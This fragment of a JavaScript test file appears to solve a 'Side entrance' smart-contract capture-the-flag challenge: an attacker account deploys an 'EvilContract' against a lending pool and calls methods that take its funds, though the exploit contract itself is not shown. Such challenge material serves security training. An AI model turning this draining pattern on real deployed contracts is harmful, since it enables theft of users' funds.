...
describe("[Challenge] Side entrance", function () {
	...
	it("Exploit", async function () {
		...
		const EvilFactory = await ethers.getContractFactory(
			"EvilContract",
			attacker
		);
		this.evil = await EvilFactory.deploy(this.pool.address);

		await this.evil.interact();
		await this.evil.takeFunds();
	});
